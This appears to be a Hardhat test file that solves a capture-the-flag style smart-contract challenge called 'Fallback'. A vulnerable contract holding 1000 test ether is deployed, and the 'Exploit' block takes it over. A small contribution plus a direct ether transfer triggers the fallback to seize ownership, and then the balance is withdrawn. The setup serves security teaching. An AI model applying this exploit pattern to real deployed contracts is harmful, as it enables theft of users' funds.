const { ethers } = require("hardhat");
const { expect } = require("chai");

/*

Look carefully at the contract's code below.

You will beat this level if

you claim ownership of the contract
you reduce its balance to 0
  Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

*/

describe("[Challenge] Fallback", function () {
  let deployer, attacker;

  const INITIAL_ETH_DEPOSIT = ethers.utils.parseEther("1000");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = await ethers.getSigners();

    this.fallback = await (
      await ethers.getContractFactory("Fallback", deployer)
    ).deploy();

    await deployer.sendTransaction({
      to: this.fallback.address,
      value: INITIAL_ETH_DEPOSIT,
    });

    const contractBalance = await ethers.provider.getBalance(
      this.fallback.address
    );
    expect(contractBalance).to.eq(INITIAL_ETH_DEPOSIT);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    await this.fallback
      .connect(attacker)
      .contribute({ value: ethers.utils.parseEther("0.0001") });

    await attacker.sendTransaction({
      to: this.fallback.address,
      value: ethers.utils.parseEther("0.0001"),
    });

    await this.fallback.connect(attacker).withdraw();
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    const contractBalance = await ethers.provider.getBalance(
      this.fallback.address
    );
    // Attacker claim ownership of the contract
    expect(await this.fallback.owner()).to.eq(attacker.address);
    // Attacker must have taken all tokens
    expect(contractBalance).to.eq(0);
  });
});
